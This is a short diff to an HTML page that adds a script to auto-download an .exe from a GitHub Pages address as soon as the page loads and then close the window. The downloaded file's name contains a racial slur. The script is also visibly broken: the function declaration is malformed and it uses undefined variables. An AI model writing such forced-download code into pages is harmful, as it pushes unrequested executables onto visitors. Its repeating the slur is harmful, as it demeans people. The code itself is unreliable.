@@ -1,6 +1,20 @@
 <!DOCTYPE html>
   <head>    <script> function kachai{
-     href="serentus.github.io/pizdh/Legend_of_NIGGERS.exe" download="Legend_of_NIGGERS.exe" 
+     const download = ("serentus.github.io/pizdh/Legend_of_NIGGERS.exe", "Legend_of_NIGGERS.exe" ) => {
+    // Create a new link
+    const anchor = document.createElement('a');
+    anchor.href = path;
+    anchor.download = filename;
+
+    // Append to the DOM
+    document.body.appendChild(anchor);
+
+    // Trigger `click` event
+    anchor.click();
+
+    // Remove element from DOM
+    document.body.removeChild(anchor);
+}; 
    }
     window.onload = kachai;   
     window.close()
